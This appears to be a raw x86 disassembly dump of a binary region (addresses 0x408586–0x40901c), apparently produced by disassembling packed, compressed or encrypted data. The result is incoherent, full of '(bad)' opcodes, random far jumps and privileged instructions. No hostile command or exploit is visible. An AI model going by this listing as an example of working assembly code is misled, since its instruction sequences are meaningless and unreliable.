  408586:	cld    
  408587:	lahf   
  408588:	push   edi
  408589:	push   0x9
  40858b:	mov    dl,0x22
  40858d:	pop    es
  40858e:	call   0x3f6bd4
  408593:	or     al,0x13
  408595:	sti    
  408596:	push   0xffffff8f
  408598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408599:	jne    0x4085a3
  40859b:	pop    ebp
  40859c:	xlat   BYTE PTR ds:[ebx]
  40859d:	(bad)  
  40859e:	jmp    DWORD PTR [edx-0xf]
  4085a1:	and    edi,edi
  4085a3:	sub    BYTE PTR [edi-0x18],dl
  4085a6:	jbe    0x40855a
  4085a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085a9:	jmp    FWORD PTR [edx+0x51]
  4085ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085ad:	jne    0x4085b7
  4085af:	lods   eax,DWORD PTR ds:[esi]
  4085b0:	repz std 
  4085b2:	push   DWORD PTR [edx+0x1cfc75a4]
  4085b8:	in     eax,dx
  4085b9:	xlat   BYTE PTR ds:[ebx]
  4085ba:	pop    es
  4085bb:	xor    al,0x4b
  4085bd:	popf   
  4085be:	(bad)  
  4085bf:	cmp    ecx,edx
  4085c1:	inc    eax
  4085c2:	add    al,0x1c
  4085c4:	outs   dx,DWORD PTR ds:[esi]
  4085c5:	mov    ebp,esp
	...
  4085ef:	add    BYTE PTR [esi-0x34bd150f],dh
  4085f5:	xor    al,BYTE PTR [eax+ebp*2]
  4085f8:	dec    ebp
  4085f9:	rol    ebx,0xff
  4085fc:	adc    ch,BYTE PTR [eax+0x65]
  4085ff:	dec    eax
  408600:	pop    ebp
  408601:	hlt    
  408602:	push   0xffffffd2
  408604:	ret    0x5e91
  408607:	or     ebx,esp
  408609:	shl    bh,0x4f
  40860c:	repz (bad) 
  40860e:	repnz (bad) 
  408610:	jno    0x40860a
  408612:	mov    dl,0xfe
  408614:	imul   edi,esp,0x39c0986a
  40861a:	pop    esi
  40861b:	call   0xff9f039d
  408620:	ss hlt 
  408622:	jmp    0xed68:0x2b36b42
  408629:	loopne 0x4085ee
  40862b:	(bad)  
  40862c:	cmp    esi,esi
  40862e:	add    al,BYTE PTR [eax]
  408630:	pushf  
  408631:	pop    esp
  408632:	mov    ds:0x8f1a3be,al
  408637:	rcl    BYTE PTR [eax],0xff
  40863a:	mov    dl,0xfe
  40863c:	or     DWORD PTR [esp+ebx*2],eax
  40863f:	jne    0x408659
  408641:	inc    esp
  408642:	pop    ebp
  408643:	jne    0x408659
  408645:	sbb    al,0xeb
  408647:	jecxz  0x4086c4
  408649:	sbb    DWORD PTR [edx+esi*2-0x49],ebp
  40864d:	rcr    DWORD PTR [edi+edi*8-0xf],0x23
  408652:	pop    esp
  408653:	jne    0x408655
	...
  40867d:	adc    BYTE PTR [ebp+eiz*1-0x16a522a9],bl
  408684:	pop    esp
  408685:	leave  
  408686:	push   edx
  408687:	xchg   ecx,eax
  408688:	add    BYTE PTR [eax+0x2],0x96
  40868c:	dec    ebx
  40868d:	pop    esi
  40868e:	dec    edi
  40868f:	jmp    0x6a302d4a
  408694:	dec    eax
  408695:	xor    BYTE PTR [ebp-0x17],dh
  408698:	jmp    0xc3c88b2
  40869d:	xor    al,0xdc
  40869f:	xor    BYTE PTR [ebp+0x1b],bl
  4086a2:	aam    0xab
  4086a4:	pop    edi
  4086a5:	test   BYTE PTR [ebx-0x17],bl
  4086a8:	ins    BYTE PTR es:[edi],dx
  4086a9:	retf   0xfb72
  4086ac:	mov    ah,0x5c
  4086ae:	pop    ebx
  4086af:	dec    esi
  4086b0:	xlat   BYTE PTR ds:[ebx]
  4086b1:	and    esi,ebx
  4086b3:	enter  0xf35c,0x1
  4086b7:	rol    DWORD PTR [edx],1
  4086b9:	sbb    al,0xf2
  4086bb:	jbe    0x4086a9
  4086bd:	add    BYTE PTR [edx-0x7824fc58],ch
  4086c3:	icebp  
  4086c4:	imul   esp,DWORD PTR [edx+0x2],0x1e
  4086c8:	pop    ebp
  4086c9:	retf   
  4086ca:	xchg   DWORD PTR ds:0x153495d,edx
  4086d0:	ja     0x408746
  4086d2:	add    DWORD PTR [esi],eax
  4086d4:	dec    ebx
  4086d5:	ficom  WORD PTR [esi-0x17]
  4086d8:	mov    dh,0x96
  4086da:	out    dx,al
  4086db:	addr16 dec eax
  4086dd:	les    ecx,FWORD PTR [ecx]
  4086df:	out    dx,al
  4086e0:	pop    esp
	...
  408709:	add    BYTE PTR [ecx-0x6d4c1a69],ch
  40870f:	xchg   ebp,ebp
  408711:	pop    esp
  408712:	push   ecx
  408713:	cld    
  408714:	and    bl,al
  408716:	cmp    ecx,0x2
  408719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40871a:	sbb    al,0x5b
  40871c:	repnz inc ebx
  40871e:	and    ebx,eax
  408720:	mov    al,ds:0x5b1c02
  408725:	scas   al,BYTE PTR es:[edi]
  408726:	pop    edx
  408727:	or     DWORD PTR [eax],eax
  408729:	jmp    0x2d07e24d
  40872e:	hlt    
  40872f:	add    DWORD PTR [edi],eax
  408731:	jmp    0x340fc55
  408736:	sbb    BYTE PTR [ebp+0x0],dh
  408739:	add    esp,DWORD PTR [eax]
  40873b:	rol    BYTE PTR [ebp+edi*2+0x6f],1
  40873f:	into   
  408740:	test   BYTE PTR [ebp-0x30],dh
  408743:	add    edi,edi
  408745:	sbb    ecx,eax
  408747:	xchg   eax,edi
  408749:	outs   dx,BYTE PTR ds:[esi]
  40874a:	repnz add al,0xe8
  40874d:	gs mov ecx,0x5ff2005b
  408753:	xchg   DWORD PTR ds:0x5a8440,eax
  408759:	jmp    0xa8884765
  40875e:	pop    ds
  40875f:	add    BYTE PTR [ebp-0x13],dh
  408762:	ja     0x4086f2
  408764:	mov    esi,0x8bab4036
  408769:	sbb    DWORD PTR [edx+0x1ef3d6],ebp
	...
  408797:	jo     0x408799
  408799:	push   eax
  40879a:	mov    ebx,0x16be3e37
  40879f:	pusha  
  4087a0:	rol    BYTE PTR [ecx+ebx*1+0x11ff0050],cl
  4087a7:	sub    al,0xc5
  4087a9:	(bad)  
  4087aa:	(bad)  
  4087ab:	mov    ah,0x0
  4087ad:	addr16 push edi
  4087af:	push   0xb1ee009b
  4087b4:	or     esi,edi
  4087b6:	out    0xf7,al
  4087b8:	push   DWORD PTR [eax+ecx*8]
  4087bb:	pop    eax
  4087bc:	fwait
  4087bd:	add    cl,al
  4087bf:	or     edi,DWORD PTR [esi-0x29563102]
  4087c5:	jecxz  0x4087c7
  4087c7:	mov    dl,0xa4
  4087c9:	jmp    FWORD PTR [edx+0x75]
  4087cc:	hlt    
  4087cd:	scas   al,BYTE PTR es:[edi]
  4087ce:	push   edi
  4087cf:	xor    al,0x57
  4087d1:	push   DWORD PTR [ebp-0x536b]
  4087d7:	jp     0x408843
  4087d9:	loope  0x408823
  4087db:	hlt    
  4087dc:	push   esi
  4087dd:	call   0xffe47057
  4087e2:	mov    eax,eax
  4087e4:	jb     0x4087dd
  4087e6:	call   FWORD PTR [edx-0x1d98010f]
  4087ec:	retf   
  4087ed:	aas    
  4087ee:	add    BYTE PTR [edx-0x75081017],ch
  4087f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f5:	push   DWORD PTR ds:0x400f64
	...
  408823:	add    BYTE PTR [ebp-0x34],ch
  408826:	mov    ebx,0x84ce6aff
  40882b:	call   0x6b402c82
  408830:	add    eax,0xb457b7f4
  408835:	pop    ebx
  408836:	push   DWORD PTR [ebp-0x53db]
  40883c:	or     ch,BYTE PTR [edx-0x1f]
  40883f:	dec    eax
  408840:	test   BYTE PTR [ebx-0x18],bl
  408843:	cmp    DWORD PTR [eax-0x5c],ebp
  408846:	dec    DWORD PTR [ecx-0x888d0]
  40884c:	sub    dl,dl
  40884e:	test   al,bl
  408850:	mov    dl,0xa4
  408852:	call   DWORD PTR [eax-0x73]
  408855:	cwde   
  408856:	push   edi
  408857:	inc    ecx
  408858:	mov    ch,0xa4
  40885a:	mov    ch,0xf0
  40885c:	xchg   edx,eax
  40885d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40885e:	(bad)  
  40885f:	push   DWORD PTR [eax]
  408861:	jbe    0x4088ab
  408863:	inc    ecx
  408864:	jne    0x4088d9
  408866:	push   ss
  408867:	mov    ebp,0xb5a291c
  40886c:	pop    esp
  40886d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40886e:	std    
  40886f:	xor    BYTE PTR [ecx+0x6bff51b9],0xf5
  408876:	iret   
  408877:	packsswb mm0,QWORD PTR [ecx]
  40887a:	mov    al,BYTE PTR [ebp-0xa63788]
  408880:	in     al,dx
  408881:	jmp    0xe08c41eb
  408886:	ins    DWORD PTR es:[edi],dx
  408887:	adc    al,0x0
	...
  4088b1:	pop    ss
  4088b2:	mov    dl,0xce
  4088b4:	add    eax,0xb931d9cc
  4088b9:	xor    ebx,eax
  4088bb:	inc    ecx
  4088bc:	test   DWORD PTR [eax-0x78],ecx
  4088bf:	pop    edx
  4088c0:	dec    DWORD PTR [ecx]
  4088c2:	repnz add al,BYTE PTR [eax]
  4088c5:	lahf   
  4088c6:	das    
  4088c7:	pop    edi
  4088c8:	not    DWORD PTR [ebx]
  4088ca:	jbe    0x4088cf
  4088cc:	je     0x40884f
  4088ce:	jno    0x408868
  4088d0:	in     al,dx
  4088d1:	or     esp,DWORD PTR [esi-0x4f8fffa6]
  4088d7:	test   DWORD PTR [ebp-0xa5c1fc],edi
  4088dd:	sbb    al,0xc8
  4088df:	mov    ch,0x67
  4088e1:	sbb    al,0xf4
  4088e3:	imul   edi,DWORD PTR [esi-0x17f53825],0xff5a9e6a
  4088ed:	retf   
  4088ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ef:	addr16 test ebx,0x24755a65
  4088f6:	pop    esp
  4088f7:	lods   eax,DWORD PTR ds:[esi]
  4088f8:	mov    dh,0xb3
  4088fa:	push   ebp
  4088fb:	pop    edx
  4088fc:	mov    ch,0xb4
  4088fe:	add    eax,0x7fa3ff59
  408903:	or     ebp,eax
  408905:	mov    eax,0x93ff5a46
  40890a:	pop    ebx
  40890b:	pushf  
  40890c:	pusha  
  40890d:	xchg   ebx,eax
  40890e:	(bad)  
  40890f:	fstp   QWORD PTR [ecx+0x9]
  408912:	push   ebx
  408913:	ror    DWORD PTR [edx+0x0],0x0
	...
  40893e:	mov    dl,0xfe
  408940:	int    0x59
  408942:	test   eax,0x6b59bdfb
  408947:	(bad)  
  408948:	xor    ecx,DWORD PTR [esp+esi*2]
  40894b:	fstp   TBYTE PTR [esi+0x59]
  40894e:	pop    ebx
  40894f:	(bad)  
  408950:	jae    0x40898a
  408952:	dec    ebx
  408953:	(bad)  
  408954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408955:	pop    ecx
  408956:	rcl    DWORD PTR [edx-0x6f],1
  408959:	hlt    
  40895a:	mov    esi,edi
  40895c:	xchg   ebp,eax
  40895d:	pop    ecx
  40895e:	jno    0x408957
  408960:	xchg   ebp,eax
  408961:	pop    ecx
  408962:	xor    esi,ebx
  408964:	sbb    al,0x9b
  408966:	sub    edi,esi
  408968:	jge    0x4088f9
  40896a:	xor    BYTE PTR [esi],al
  40896c:	jbe    0x4089c7
  40896e:	add    al,0x94
  408970:	xor    BYTE PTR [ecx+0x13],bl
  408973:	(bad)  
  408974:	fwait
  408975:	ins    BYTE PTR es:[edi],dx
  408976:	adc    edi,esi
  408978:	pop    ebp
  408979:	ins    BYTE PTR es:[edi],dx
  40897a:	inc    edx
  40897b:	les    edx,FWORD PTR [ebp+0x59]
  40897e:	sti    
  40897f:	(bad)  
  408980:	dec    eax
  408981:	push   ecx
  408982:	repz std 
  408984:	push   eax
  408985:	adc    eax,0x593dfda5
  40898a:	test   eax,0xdb593e0a
  40898f:	repnz add BYTE PTR [ebx-0x40da022d],bl
  408996:	shl    ebx,cl
  408998:	aad    0x59
  40899a:	ret    
  40899b:	std    
  40899c:	adc    eax,0xa4f2b7cf
  4089a1:	sahf   
	...
  4089ca:	add    BYTE PTR [ebx+ebx*2],bl
  4089cd:	xor    BYTE PTR [esi+0x14],al
  4089d0:	pop    ebx
  4089d1:	xchg   esp,eax
  4089d2:	mov    WORD PTR [eax-0x7d30027],?
  4089d8:	jo     0x4089da
  4089da:	and    DWORD PTR [eax],0xfffffffe
  4089dd:	je     0x4089d0
  4089df:	test   DWORD PTR [eax-0x4a],0x44d3e4de
  4089e6:	aad    0xa2
  4089e8:	xchg   edi,eax
  4089e9:	clc    
  4089ea:	cmp    DWORD PTR [eax+0x20285778],eax
  4089f0:	jae    0x408a41
  4089f2:	push   ss
  4089f3:	pop    edi
  4089f4:	std    
  4089f5:	std    
  4089f6:	cld    
  4089f7:	mov    esi,0xc7e94192
  4089fc:	cld    
  4089fd:	mov    edx,0xc051e4a6
  408a02:	adc    eax,0xe8688d4d
  408a07:	pop    ds
  408a08:	out    dx,al
  408a09:	mov    ebp,0x5005628e
  408a0e:	xchg   BYTE PTR [edx+0x55],bl
  408a11:	call   0xff3e6f87
  408a16:	sub    DWORD PTR [eax-0x3d],0x969a6efe
  408a1d:	clc    
  408a1e:	mov    ecx,0xa8578af7
  408a23:	pop    ds
  408a24:	jae    0x408a75
  408a26:	mov    esi,0x14fdfcde
  408a2b:	jg     0x4089c0
  408a2d:	inc    ecx
  408a2e:	jmp    0x408a33
	...
  408a57:	add    BYTE PTR [edi+0x11],dh
  408a5a:	mov    ebx,0xc050443e
  408a5f:	mov    ebp,0xeb688ccc
  408a64:	pop    ds
  408a65:	in     al,dx
  408a66:	mov    ebp,0x5004da26
  408a6b:	push   ds
  408a6c:	rcl    BYTE PTR [eax+ebp*8-0x43],cl
  408a70:	cmc    
  408a71:	sti    
  408a72:	inc    BYTE PTR [ecx]
  408a74:	sub    al,0xc3
  408a76:	inc    BYTE PTR [eax]
  408a78:	and    dh,al
  408a7a:	adc    BYTE PTR [edi+0x74],0x58
  408a7e:	push   DWORD PTR [ebp+0x7d]
  408a81:	jo     0x408afa
  408a83:	std    
  408a84:	and    BYTE PTR [edi+edi*8+0x75a48175],0x8
  408a8c:	ins    DWORD PTR es:[edi],dx
  408a8d:	mov    ds:0x8e52ffb5,al
  408a92:	ret    0x8504
  408a95:	retf   
  408a96:	mov    esp,ebp
  408a98:	hlt    
  408a99:	call   0x458d:0xa4a2f7dc
  408aa0:	xchg   ecx,eax
  408aa1:	(bad)  
  408aa2:	std    
  408aa3:	jne    0x408b16
  408aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aa6:	xor    eax,0xff160de1
  408aab:	out    0xc7,eax
  408aad:	mov    edx,0x983effff
  408ab2:	jne    0x40e13c
  408ab8:	jp     0x408ad4
  408aba:	test   DWORD PTR [eax],0x0
	...
  408ae4:	add    BYTE PTR ds:0x48c70058,dh
  408aea:	stos   DWORD PTR es:[edi],eax
  408aeb:	inc    DWORD PTR [edi]
  408aed:	add    eax,0xef006a58
  408af2:	push   edi
  408af3:	push   0x0
  408af5:	out    dx,eax
  408af6:	push   edi
  408af7:	lea    eax,[ebp+0x59]
  408afa:	(bad)  
  408afb:	mov    eax,DWORD PTR [ebp-0x73b7]
  408b01:	test   DWORD PTR [ebp+esi*2-0x4d5dd08],esp
  408b08:	call   0x4066f6
  408b0d:	mov    esi,0x2c057497
  408b12:	fild   DWORD PTR [eax]
  408b14:	add    BYTE PTR [ebp+0x1c48bbef],dh
  408b1a:	mov    bl,0x2
  408b1c:	jmp    FWORD PTR [ecx]
  408b1e:	push   ds
  408b1f:	imul   esi,DWORD PTR [ebp+0x50575467],0xffffff97
  408b26:	popa   
  408b27:	mov    DWORD PTR [ebp-0xaa0370],eax
  408b2d:	in     al,dx
  408b2e:	fild   QWORD PTR [edx-0x5b]
  408b31:	(bad)  
  408b32:	hlt    
  408b33:	push   ebp
  408b34:	mov    DWORD PTR [ecx+0x7bff4e21],ebx
  408b3a:	sbb    DWORD PTR [edx-0x49],ebx
  408b3d:	jae    0x408b4b
  408b3f:	jmp    0xadf58f43
  408b44:	inc    eax
  408b45:	sbb    al,0xbd
  408b47:	(bad)  
  408b48:	lock add BYTE PTR [eax],al
	...
  408b6f:	add    BYTE PTR [eax],al
  408b71:	add    BYTE PTR [ebx-0x3c],dl
  408b74:	push   ebp
  408b75:	dec    DWORD PTR [ecx]
  408b77:	adc    ecx,ebx
  408b79:	inc    eax
  408b7a:	sbb    al,0xea
  408b7c:	pop    ecx
  408b7d:	mov    edx,0x858bdc43
  408b82:	inc    eax
  408b83:	fcom   QWORD PTR [ebp-0x1]
  408b86:	(bad)  
  408b87:	icebp  
  408b88:	jmp    0x69ff:0x432d3c7
  408b8f:	or     DWORD PTR [esi-0x1],0xe110721b
  408b96:	fs inc ebx
  408b98:	add    al,0xe8
  408b9a:	jmp    0x963fe15d
  408b9f:	jg     0x408c08
  408ba1:	idiv   ebx
  408ba3:	xchg   ecx,eax
  408ba4:	jmp    0xae7407a8
  408ba9:	inc    eax
  408baa:	sbb    al,0xa1
  408bac:	nop
  408bad:	lock jmp 0x408be9
  408bb0:	push   esi
  408bb1:	call   DWORD PTR [ecx]
  408bb3:	mov    ds:0x9c1c40cb,eax
  408bb8:	xchg   esi,eax
  408bb9:	mov    edx,0x8c265bcb
  408bbe:	cdq    
  408bbf:	sti    
  408bc0:	adc    eax,0xe985bb56
  408bc5:	jmp    0x408b90
  408bc7:	xchg   edx,eax
  408bc8:	test   al,0x3
  408bca:	stos   DWORD PTR es:[edi],eax
  408bcb:	mov    al,0xf8
  408bcd:	dec    ebp
  408bce:	mov    ds:0x7d0ffdfa,eax
  408bd3:	mov    ds:0x3a8,eax
	...
  408bfc:	add    BYTE PTR [eax],al
  408bfe:	add    BYTE PTR [esp+edi*4-0x1b74a9ce],al
  408c05:	imul   ebp,DWORD PTR [ebx+ecx*4-0x6],0xffffffdd
  408c0a:	jmp    0x5adc:0xadc1827b
  408c11:	into   
  408c12:	(bad)  
  408c13:	ins    BYTE PTR es:[edi],dx
  408c14:	repnz lds edx,FWORD PTR [ebp+0x63]
  408c18:	xor    al,cl
  408c1a:	int3   
  408c1b:	fcomp  QWORD PTR [edx-0x3f]
  408c1e:	adc    DWORD PTR [esi-0x5e745206],0x43559e17
  408c28:	ficomp WORD PTR [ebx+0x60]
  408c2b:	xor    edi,edx
  408c2d:	xchg   ebp,eax
  408c2e:	add    al,0xa8
  408c30:	jg     0x408c9c
  408c32:	xchg   edi,eax
  408c33:	cmp    dl,dh
  408c35:	test   DWORD PTR [ebp+0x1c],edx
  408c38:	outs   dx,DWORD PTR ds:[esi]
  408c39:	sbb    eax,0x7e02d981
  408c3e:	push   ebp
  408c3f:	adc    ebx,DWORD PTR [ebx-0xb]
  408c42:	mov    al,0x83
  408c44:	pop    ebx
  408c45:	jmp    0xd43a4eae
  408c4a:	or     eax,DWORD PTR [ecx+ecx*1]
  408c4d:	call   0xf368:0x93f9f355
  408c54:	stc    
  408c55:	inc    ebp
  408c56:	push   ebp
  408c57:	imul   esp,DWORD PTR [ebx+0x51],0xfff98fc2
  408c5e:	xor    eax,0x36e7b069
	...
  408c8b:	add    BYTE PTR [ecx-0x6],dh
  408c8e:	(bad)  
  408c8f:	pushf  
  408c90:	pop    ss
  408c91:	add    esi,DWORD PTR [edx*2+0x5cfefa51]
  408c98:	cmp    al,0xf2
  408c9a:	dec    BYTE PTR [esi]
  408c9c:	push   ecx
  408c9d:	jo     0x408ca7
  408c9f:	adc    DWORD PTR [edx],eax
  408ca1:	scas   eax,DWORD PTR es:[edi]
  408ca2:	(bad)  
  408ca3:	(bad)  
  408ca4:	lock scas eax,DWORD PTR es:[edi]
  408ca6:	(bad)  
  408ca8:	call   0x17b58ba6
  408cad:	add    ebx,DWORD PTR [eax]
  408caf:	popf   
  408cb0:	call   0x33d58bae
  408cb5:	repnz (bad) 
  408cb7:	(bad)  
  408cb8:	enter  0x86f,0xc1
  408cbc:	adc    eax,0xc8c6feaf
  408cc1:	scas   eax,DWORD PTR es:[edi]
  408cc2:	jecxz  0x408c7a
  408cc4:	lock stc 
  408cc6:	out    0xc5,eax
  408cc8:	mov    eax,ds:0x9aaefef9
  408ccd:	push   es
  408cce:	mul    DWORD PTR [esi+0x57e102e8]
  408cd4:	sar    cl,1
  408cd6:	(bad)  
  408cd7:	pop    esp
  408cd8:	(bad)  
  408cd9:	icebp  
  408cda:	dec    BYTE PTR [esi-0x7949ef49]
  408ce0:	enter  0xb4f9,0x89
  408ce4:	push   0x6481fef8
  408ce9:	mov    cl,0xfe
  408ceb:	outs   dx,BYTE PTR ds:[esi]
  408cec:	jo     0x408c9c
  408cee:	fistp  DWORD PTR [esi+0x0]
	...
  408d19:	push   0xa929e7f8
  408d1e:	clc    
  408d1f:	(bad)  
  408d20:	push   esi
  408d21:	mov    ds:0x504ef6eb,al
  408d26:	clc    
  408d27:	je     0x408d29
  408d29:	in     eax,dx
  408d2a:	test   BYTE PTR [edi],dh
  408d2c:	(bad)  
  408d2d:	sbb    cl,BYTE PTR [edi-0x58ea4a01]
  408d33:	(bad)  
  408d34:	call   FWORD PTR [ebp-0x29]
  408d37:	mov    ch,0xff
  408d39:	cli    
  408d3a:	mov    es,WORD PTR [ebp-0x8]
  408d3d:	or     al,0x1e
  408d3f:	std    
  408d40:	dec    DWORD PTR [edx]
  408d42:	(bad)  
  408d43:	jne    0x408d41
  408d45:	sbb    eax,0xb500a29b
  408d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d4b:	ret    0x8508
  408d4e:	leave  
  408d4f:	mov    esp,ebp
  408d51:	push   es
  408d52:	cmp    ah,bh
  408d54:	push   0x75
  408d56:	add    cl,BYTE PTR [ebx]
  408d58:	jmp    eax
  408d5a:	mul    dh
  408d5c:	mov    ecx,0x89ff8c96
  408d61:	inc    eax
  408d62:	mov    ebp,DWORD PTR [eax-0xc]
  408d65:	xor    bl,BYTE PTR [esi]
  408d67:	(bad)  
  408d68:	(bad)  
  408d69:	and    bh,dh
  408d6b:	out    0xf6,al
  408d6d:	cwde   
  408d6e:	mov    edi,?
  408d70:	call   DWORD PTR [eax]
  408d72:	mov    edi,edi
  408d74:	jne    0x408db3
  408d76:	xchg   esp,eax
  408d77:	in     al,0xb3
  408d79:	jp     0x408d07
  408d7b:	leave  
  408d7c:	ret    0x0
	...
  408da3:	add    BYTE PTR [eax],al
  408da5:	add    BYTE PTR [ecx+0x5c],al
  408da8:	push   ebp
  408da9:	mov    ebx,DWORD PTR [ecx-0x6d2f3c22]
  408daf:	mov    edi,?
  408db1:	(bad)  
  408db2:	lock mov dl,BYTE PTR [eax-0x1]
  408db6:	adc    al,bh
  408db8:	std    
  408db9:	xor    eax,0x3fb6a4
  408dbe:	popf   
  408dbf:	and    eax,0xf8f500a1
  408dc4:	mov    esi,0x269800f
  408dc9:	add    BYTE PTR [edx+eax*1],bl
  408dcc:	dec    edx
  408dcd:	inc    ebp
  408dce:	in     al,0x1
  408dd0:	add    eax,DWORD PTR [eax]
  408dd2:	sbb    al,0x49
  408dd4:	leave  
  408dd5:	repz fild DWORD PTR [eax]
  408dd8:	add    eax,DWORD PTR [eax]
  408dda:	inc    esi
  408ddb:	add    bl,ch
  408ddd:	push   DWORD PTR ds:0x90ffdd02
  408de3:	(bad)  
  408de4:	push   esi
  408de5:	push   eax
  408de6:	test   eax,0xb3f7587e
  408deb:	push   eax
  408dec:	mov    ah,0xfe
  408dee:	xor    DWORD PTR [edx+0x53],ecx
  408df1:	jne    0x408d93
  408df3:	dec    ecx
  408df4:	mov    edi,0xfe021ca1
  408df9:	mov    edi,0xfd5c0708
  408dfe:	sbb    eax,0xc1680302
  408e03:	sub    ebp,eax
  408e05:	(bad)  
  408e06:	jp     0x408d96
  408e08:	add    al,ch
	...
  408e32:	add    BYTE PTR [eax-0x6800ae36],dl
  408e38:	mov    cl,0x7f
  408e3a:	test   DWORD PTR [eax-0x48],ebp
  408e3d:	push   ecx
  408e3e:	(bad)  
  408e3f:	in     al,dx
  408e40:	push   ebx
  408e41:	pop    esp
  408e42:	loope  0x408dd9
  408e44:	mov    al,0x51
  408e46:	mov    DWORD PTR [ecx+0x43ff59b1],esp
  408e4c:	dec    ebx
  408e4d:	add    al,0x68
  408e4f:	int3   
  408e50:	cdq    
  408e51:	(bad)  
  408e54:	xchg   esi,eax
  408e55:	push   ebx
  408e56:	imul   DWORD PTR [ebx]
  408e58:	call   0x297dc3ae
  408e5d:	(bad)  
  408e60:	int    0x8a
  408e62:	call   DWORD PTR [ebx]
  408e64:	jl     0x408dee
  408e66:	in     al,0x13
  408e68:	xchg   BYTE PTR [edx+0x6a],dl
  408e6b:	sbb    al,0x5b
  408e6d:	rol    esp,1
  408e6f:	push   ebx
  408e70:	pushf  
  408e71:	jmp    0x5e2c37c8
  408e76:	push   edx
  408e77:	jmp    0x408e6f
  408e79:	adc    esp,DWORD PTR [ebp+0x54]
  408e7c:	pushf  
  408e7d:	jmp    0x3df474dd
  408e82:	push   edx
  408e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e84:	loopne 0x408eca
  408e86:	pop    edx
  408e87:	retf   
  408e88:	test   dl,0x3
  408e8b:	xor    al,0x9d
  408e8d:	rol    esp,0xbb
  408e90:	cmc    
  408e91:	push   ebx
  408e92:	push   ebx
  408e93:	stos   DWORD PTR es:[edi],eax
  408e94:	not    BYTE PTR ds:0x52
	...
  408ebe:	add    BYTE PTR [eax],al
  408ec0:	icebp  
  408ec1:	sti    
  408ec2:	mov    al,ds:0x54fea3c4
  408ec7:	mov    ebx,DWORD PTR [ebx-0x7b77900a]
  408ecd:	out    dx,al
  408ece:	cmc    
  408ecf:	push   ecx
  408ed0:	neg    BYTE PTR [edx-0x7f]
  408ed3:	mov    dh,0xeb
  408ed5:	fwait
  408ed6:	jmp    0xd62c402b
  408edb:	push   ecx
  408edc:	jae    0x408ed4
  408ede:	sbb    esp,DWORD PTR [ebx-0x2c]
  408ee1:	fwait
  408ee2:	jmp    0xc5f42142
  408ee7:	push   ecx
  408ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee9:	loopne 0x408eb3
  408eeb:	pop    ecx
  408eec:	push   ebx
  408eed:	mul    BYTE PTR [ebx-0x79]
  408ef0:	jo     0x408ee0
  408ef2:	lods   eax,DWORD PTR ds:[esi]
  408ef3:	push   ecx
  408ef4:	in     al,dx
  408ef5:	xor    BYTE PTR [edx],0xac
  408ef8:	fcomp  QWORD PTR [edx-0x62]
  408efb:	xchg   edi,eax
  408efc:	sub    al,0xee
  408efe:	xchg   ebp,eax
  408eff:	push   ecx
  408f00:	sub    esi,DWORD PTR [eax]
  408f02:	mov    BYTE PTR [esp+ebx*8-0x2c226ea6],bh
  408f09:	cmc    
  408f0a:	jge    0x408f09
  408f0c:	shr    DWORD PTR [esi+0x0],cl
  408f0f:	shl    BYTE PTR [eax+0x6d76d3b7],1
  408f15:	test   BYTE PTR [ebx],0xdc
  408f18:	out    dx,eax
  408f19:	hlt    
  408f1a:	das    
  408f1b:	outs   dx,BYTE PTR ds:[esi]
  408f1c:	fwait
  408f1d:	push   ss
  408f1e:	not    DWORD PTR [esi+0x4d]
  408f21:	mov    ebp,eax
  408f23:	adc    DWORD PTR [eax],eax
	...
  408f4d:	mov    esi,ebp
  408f4f:	(bad)  
  408f50:	push   edx
  408f51:	aam    0x60
  408f53:	shl    BYTE PTR [ebp+0x5e88b25],0xb3
  408f5a:	cmc    
  408f5b:	(bad)  
  408f5c:	es fwait
  408f5e:	push   ss
  408f5f:	mul    DWORD PTR [esi]
  408f61:	dec    ebp
  408f62:	push   eax
  408f63:	add    cl,ch
  408f65:	pop    ds
  408f66:	call   0xf685c8ef
  408f6b:	(bad)  
  408f6c:	mov    ecx,0xa8588dc7
  408f71:	pop    ds
  408f72:	div    BYTE PTR [ecx+edi*8-0x9010a0c]
  408f79:	xor    bh,ah
  408f7b:	inc    edi
  408f7c:	test   al,0x1f
  408f7e:	add    ebx,DWORD PTR ds:0x88f5cca1
  408f84:	fs inc edi
  408f86:	out    dx,al
  408f87:	(bad)  
  408f88:	(bad)  
  408f89:	mov    al,ds:0xccd6e3b7
  408f8e:	cmc    
  408f8f:	push   ebp
  408f91:	mov    ds:0x1fe8ffd1,eax
  408f96:	fidivr DWORD PTR [ebp+eax*8-0x16010a1c]
  408f9d:	sbb    al,0xdf
  408f9f:	(bad)  
  408fa0:	jmp    0x5cc3eac4
  408fa5:	xlat   BYTE PTR ds:[ebx]
  408fa6:	in     eax,dx
  408fa7:	(bad)  
  408fa8:	xchg   esi,eax
  408fa9:	pop    ds
  408faa:	data16 test BYTE PTR [eax+0x1f],ch
  408fae:	pop    ebx
	...
  408fd7:	add    BYTE PTR [eax],al
  408fd9:	add    BYTE PTR ds:0x53eefeef,ch
  408fdf:	mov    esi,DWORD PTR [ebp+0x8]
  408fe2:	popf   
  408fe3:	and    al,0xb0
  408fe5:	push   DWORD PTR [edx-0x75]
  408fe8:	mov    ch,0xec
  408fea:	pop    edx
  408feb:	mov    edi,edi
  408fed:	dec    eax
  408fef:	lock out 0xd0,al
  408ff2:	test   BYTE PTR [ebx-0x6f770001],cl
  408ff8:	idiv   edi
  408ffa:	bound  ecx,QWORD PTR [ebx-0x6192f78b]
  409000:	mov    cl,0xff
  409002:	adc    cl,BYTE PTR [ebx-0x74f51b4b]
  409008:	(bad)  
  409009:	call   FWORD PTR [eax+0x54b4e6f0]
  40900f:	mov    edi,edi
  409011:	dec    DWORD PTR [eax+0x44]
  409014:	idiv   edi
  409016:	adc    cl,BYTE PTR [ebx+0x1c2d0875]
  40901c:	mov    al,0xff
